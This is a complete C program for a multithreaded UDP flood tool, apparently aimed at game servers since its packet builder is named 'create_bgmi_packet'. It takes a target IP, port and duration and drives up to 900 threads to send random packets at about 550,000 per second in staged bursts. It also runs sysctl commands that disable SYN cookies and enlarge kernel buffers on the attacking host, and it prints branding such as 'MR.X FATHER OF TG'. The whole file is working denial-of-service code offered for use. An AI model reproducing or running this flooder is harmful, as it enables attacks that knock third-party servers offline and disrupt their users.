#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define FLOOD_SOCKETS 384
#define MIN_PACKET_SIZE 24
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 50
#define MAX_THREADS 900
#define MIN_ATTACK_TIME 60
#define MAX_ATTACK_TIME 300
#define BASE_PPS 550000
#define PORT_RANGE 40000
#define BATCH_UPDATE 15000
#define PHASE_WARMUP1 3
#define PHASE_WAIT1 1
#define PHASE_WARMUP2 3
#define PHASE_WAIT2 1

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int attack_phase = 0;
_Atomic unsigned long long target_pps = BASE_PPS;

struct sockaddr_in target_addr;

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=536870912 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=134217728 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=536870912 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=134217728 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=10000000 >/dev/null 2>&1");
    system("sysctl -w net.core.optmem_max=16777216 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='16777216 33554432 67108864' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=32768 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=32768 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='15000 60000' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=65535 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget=600 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget_usecs=6000 >/dev/null 2>&1");
    system("sysctl -w net.core.dev_weight=512 >/dev/null 2>&1");
    system("sysctl -w vm.swappiness=1 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_ratio=5 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_background_ratio=2 >/dev/null 2>&1");
    system("sysctl -w vm.vfs_cache_pressure=50 >/dev/null 2>&1");
    system("sysctl -w vm.min_free_kbytes=1048576 >/dev/null 2>&1");
    system("sysctl -w kernel.pid_max=4194304 >/dev/null 2>&1");
    system("sysctl -w kernel.threads-max=9999999 >/dev/null 2>&1");
    system("sysctl -w kernel.msgmax=65536 >/dev/null 2>&1");
    system("sysctl -w kernel.msgmnb=65536 >/dev/null 2>&1");
    system("sysctl -w kernel.sem='1000 1024000 200 4096' >/dev/null 2>&1");
    system("sysctl -w kernel.msgmni=65536 >/dev/null 2>&1");
    system("sysctl -w kernel.shmmax=68719476736 >/dev/null 2>&1");
    system("sysctl -w kernel.shmall=4294967296 >/dev/null 2>&1");
#endif
}

void set_sock_buf(int sock) {
    int sndbuf = 134217728;
    int rcvbuf = 67108864;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#ifdef SO_PRIORITY
    int priority = 0;
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
#endif
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

void create_bgmi_packet(char *buf, int size, int thread_id, int seq, unsigned int *seed) {
    if (size < 24) size = 24;
    memset(buf, 0, size);
    
    unsigned int *header = (unsigned int*)buf;
    header[0] = 0xDEADBEEF ^ thread_id ^ seq;
    header[1] = time(NULL) ^ *seed;
    header[2] = thread_id * 7777 + seq;
    header[3] = *seed ^ seq ^ thread_id;
    
    int start = 16;
    for (int i = start; i < size; i++) {
        buf[i] = (fast_rand(seed) + i) & 0xFF;
    }
}

void rate_limit_sleep(unsigned long long sent_this_burst, struct timeval *burst_start) {
    if (sent_this_burst == 0 || THREAD_COUNT <= 0) return;
    
    struct timeval burst_end;
    gettimeofday(&burst_end, NULL);
    
    long elapsed_us = (burst_end.tv_sec - burst_start->tv_sec) * 1000000L + 
                     (burst_end.tv_usec - burst_start->tv_usec);
    
    unsigned long long target_pps_current = atomic_load(&target_pps);
    if (target_pps_current == 0) return;
    
    long per_thread_pps;
    if (THREAD_COUNT < 100) {
        per_thread_pps = target_pps_current / 100;
    } else {
        per_thread_pps = target_pps_current / THREAD_COUNT;
    }
    
    if (per_thread_pps == 0) per_thread_pps = 2500;
    
    long target_us = (sent_this_burst * 1000000L) / per_thread_pps;
    
    if (target_us > 0 && elapsed_us < target_us) {
        long sleep_us = target_us - elapsed_us;
        if (sleep_us > 30 && sleep_us < 15000) {
            usleep(sleep_us);
        }
    }
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[FLOOD_SOCKETS];
    char *packets[FLOOD_SOCKETS];
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) {
            socks[i] = -1;
            continue;
        }
        
        set_sock_buf(socks[i]);
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(15000 + (rand() % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) == 0) {
            packets[i] = malloc(PACKET_SIZE);
            if (!packets[i]) {
                close(socks[i]);
                socks[i] = -1;
                continue;
            }
        } else {
            close(socks[i]);
            socks[i] = -1;
        }
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_counter = thread_idx * 100000;
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_idx * 1234567) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    int pre_warm = (THREAD_COUNT > 300) ? 80 : 120;
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0 && packets[i]) {
            for (int p = 0; p < pre_warm; p++) {
                create_bgmi_packet(packets[i], PACKET_SIZE, thread_idx + 1000, p, &seed);
                sendto(socks[i], packets[i], PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr*)&target_addr, sizeof(target_addr));
            }
        }
    }
    
    struct timeval sync_time;
    gettimeofday(&sync_time, NULL);
    int wait_ms = 1000 - (sync_time.tv_usec / 1000);
    if (wait_ms > 50) {
        usleep(wait_ms * 1000);
    }
    
    while (!atomic_load(&stop_signal)) {
        int phase = atomic_load(&attack_phase);
        
        if (phase == 2 || phase == 4) {
            sleep(1);
            continue;
        }
        
        struct timeval burst_start;
        gettimeofday(&burst_start, NULL);
        
        unsigned long long burst_packets = 0;
        
        int burst;
        if (THREAD_COUNT < 150) {
            burst = 300 + (rand() % 150);
        } else if (THREAD_COUNT < 300) {
            burst = 220 + (rand() % 110);
        } else {
            burst = 180 + (rand() % 90);
        }
        
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || !packets[i]) continue;
            
            create_bgmi_packet(packets[i], PACKET_SIZE, thread_idx + 1000, seq_counter, &seed);
            
            for (int b = 0; b < burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(socks[i], packets[i], PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret > 0) {
                    local_packets++;
                    local_bytes += PACKET_SIZE;
                    seq_counter++;
                    burst_packets++;
                }
            }
        }
        
        rate_limit_sleep(burst_packets, &burst_start);
        
        int local_batch_update = (THREAD_COUNT > 300) ? 10000 : BATCH_UPDATE;
        if (local_packets >= local_batch_update) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i]) free(packets[i]);
    }
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(tid % 2, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
#endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    set_sock_buf(s);
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(15000 + (rand() % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_local = tid * 77777;
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (tid * 7654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    int pre_warm = (THREAD_COUNT > 300) ? 50 : 80;
    for (int p = 0; p < pre_warm; p++) {
        create_bgmi_packet(packet, PACKET_SIZE, tid, p, &seed);
        sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
    
    struct timeval sync_time;
    gettimeofday(&sync_time, NULL);
    int wait_ms = 1000 - (sync_time.tv_usec / 1000);
    if (wait_ms > 50) {
        usleep(wait_ms * 1000);
    }
    
    while (!atomic_load(&stop_signal)) {
        int phase = atomic_load(&attack_phase);
        
        if (phase == 2 || phase == 4) {
            sleep(1);
            continue;
        }
        
        struct timeval burst_start;
        gettimeofday(&burst_start, NULL);
        
        create_bgmi_packet(packet, PACKET_SIZE, tid, seq_local, &seed);
        
        unsigned long long burst_packets = 0;
        int burst;
        if (THREAD_COUNT < 150) {
            burst = 200 + (rand() % 100);
        } else if (THREAD_COUNT < 300) {
            burst = 150 + (rand() % 75);
        } else {
            burst = 120 + (rand() % 60);
        }
        
        for (int b = 0; b < burst && !atomic_load(&stop_signal); b++) {
            int ret = sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            if (ret > 0) {
                local_packets++;
                local_bytes += PACKET_SIZE;
                seq_local++;
                burst_packets++;
            }
        }
        
        rate_limit_sleep(burst_packets, &burst_start);
        
        int local_batch_update = (THREAD_COUNT > 300) ? 6000 : 10000;
        if (local_packets >= local_batch_update) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    free(packet);
    close(s);
    return NULL;
}

void *phase_controller(void *arg) {
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    
    atomic_store(&target_pps, (unsigned long long)(BASE_PPS * 0.6));
    printf("🎯 PHASE 1: 3s @ 60%%\n");
    atomic_store(&attack_phase, 1);
    sleep(PHASE_WARMUP1);
    
    printf("⏸️  WAIT 1: 1s\n");
    atomic_store(&attack_phase, 2);
    sleep(PHASE_WAIT1);
    
    atomic_store(&target_pps, (unsigned long long)(BASE_PPS * 0.9));
    printf("🎯 PHASE 2: 3s @ 90%%\n");
    atomic_store(&attack_phase, 3);
    sleep(PHASE_WARMUP2);
    
    printf("⏸️  WAIT 2: 1s\n");
    atomic_store(&attack_phase, 4);
    sleep(PHASE_WAIT2);
    
    int main_attack = ATTACK_TIME - 8;
    if (main_attack < 30) main_attack = 30;
    
    atomic_store(&target_pps, BASE_PPS);
    printf("\n💀 FINAL PHASE: %ds @ 100%%\n\n", main_attack);
    atomic_store(&attack_phase, 5);
    sleep(main_attack);
    
    sleep(1);
    atomic_store(&stop_signal, 1);
    return NULL;
}

void *stats_monitor(void *arg) {
    sleep(1);
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    
    int elapsed = 0;
    
    while (!atomic_load(&stop_signal)) {
        sleep(1);
        elapsed++;
        
        int current_phase;
        if (elapsed <= PHASE_WARMUP1) {
            current_phase = 1;
        } else if (elapsed <= PHASE_WARMUP1 + PHASE_WAIT1) {
            current_phase = 2;
        } else if (elapsed <= PHASE_WARMUP1 + PHASE_WAIT1 + PHASE_WARMUP2) {
            current_phase = 3;
        } else if (elapsed <= PHASE_WARMUP1 + PHASE_WAIT1 + PHASE_WARMUP2 + PHASE_WAIT2) {
            current_phase = 4;
        } else {
            current_phase = 5;
        }
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        
        if (current_phase == 2 || current_phase == 4) {
            printf("⏸️  (Wait  🙏 MR.X)\n");
        } else {
            unsigned long long bytes_diff = curr_bytes - prev_bytes;
            double megabytes = bytes_diff / (1024.0 * 1024.0);
            
            atomic_store(&current_pps, pps);
            
            unsigned long long current_peak = atomic_load(&peak_pps);
            if (current_peak == 0) {
                atomic_store(&peak_pps, pps);
            } else if (pps > current_peak) {
                // FIXED: Prevent division by zero and allow reasonable growth
                unsigned long long max_increase;
                if (current_peak < 10000) {
                    max_increase = 10000;  // Minimum increase for small peaks
                } else {
                    max_increase = current_peak / 10;  // Max 10% increase
                }
                
                if ((pps - current_peak) > max_increase) {
                    atomic_store(&peak_pps, current_peak + max_increase);
                } else {
                    atomic_store(&peak_pps, pps);
                }
            }
            
            if (current_phase == 1 || current_phase == 3) {
                printf("🎯 PPS: %lluK | Peak: %lluK | %.1fMB\n", 
                       pps/1000, atomic_load(&peak_pps)/1000, megabytes);
            } else {
                printf("💀 PPS: %lluK | Peak: %lluK | %.1fMB\n", 
                       pps/1000, atomic_load(&peak_pps)/1000, megabytes);
            }
        }
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
    }
    
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (elapsed > 0) {
        double avg_pps = total_p / (double)elapsed;
        double total_mb = total_b / (1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_mb/1024.0);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ (time(NULL) << 16));
    
    optimize_kernel();
    
    atomic_store(&target_pps, BASE_PPS);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_signal, 0);
    atomic_store(&attack_phase, 0);
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
    }
    
    pthread_t phase_thread;
    pthread_create(&phase_thread, NULL, phase_controller, NULL);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    pthread_join(phase_thread, NULL);
    pthread_join(direct_thread, NULL);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    free(threads);
    free(tids);
    
    printf("Cleanup complete\n");
    
    return 0;
}